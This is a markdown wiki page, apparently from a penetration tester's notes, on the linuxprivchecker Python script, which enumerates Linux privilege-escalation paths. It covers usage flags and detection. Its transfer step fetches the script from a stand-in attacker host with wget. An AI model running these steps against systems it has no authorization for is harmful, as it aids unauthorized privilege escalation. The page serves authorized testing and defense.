# linuxprivchecker

[sleventyeleven/linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) — a **Linux** privilege-escalation enumeration script in **Python**. Useful on a box that has Python but where you'd rather not fetch a big shell script, or as a cross-check against [linPEAS](PEASS.md)/[LinEnum](LinEnum.md). Supports Python 2 and 3 (the author calls the Py3 port a "stable beta").

> Authorized testing only. Note it in your engagement `tools.txt`; confirm findings by hand against [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md). The author's own caveat: it's "as-is with no promise of functionality or accuracy" — a supplement, not your primary.

## Get it onto the target

```bash
# attack box
python3 -m http.server 80
# target
cd /tmp && wget http://ATTACKER/linuxprivchecker.py
```

Transfer channels: [netcat](../Shell/netcat.md), [smb](../Tools/smb.md).

## Run it

```bash
python linuxprivchecker.py                        # python 2
python3 -m linuxprivchecker                         # python 3
python3 linuxprivchecker.py -w -o /tmp/out.txt      # also write a log file
python3 linuxprivchecker.py -s                      # skip the slow/intensive searches
```

| Flag | Does |
| --- | --- |
| `-s`, `--searches` | Skip time-consuming / resource-intensive searches |
| `-w`, `--write` | Write a log file (pair with `-o` for the path) |
| `-o <file>`, `--outfile` | Where to write results (must be writable by you) |
| `-h`, `--help` | Help |

## Reading the output

It enumerates system info and common vectors (world-writable files, SUID, misconfigurations). Treat each as a candidate: map it to a technique in [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md) and [GTFOBins](https://gtfobins.github.io), then reproduce by hand. Because accuracy isn't guaranteed, cross-check anything important against [linPEAS](PEASS.md).

## Defense / detection

- Same signature as any filesystem-wide enumerator, plus a `python`/`python3` process doing the reading. See [Abnormal User Behavior](../../Defense/SOC2/Abnormal%20User%20Behavior.md) and [Host-based logging on Linux](../../Defense/Logging/Host-based/Linux.md).
- Fix the underlying misconfigs — [1. Linux Hardening](../../Defense/System%20and%20Services%20Hardening/1.%20Linux%20Hardening.md).

## Related

[folder README](README.md) · [PEASS](PEASS.md) (linPEAS) · [LinEnum](LinEnum.md) · [Linux Privilege Escalation](../Linux/Privilege%20Escalation.md)
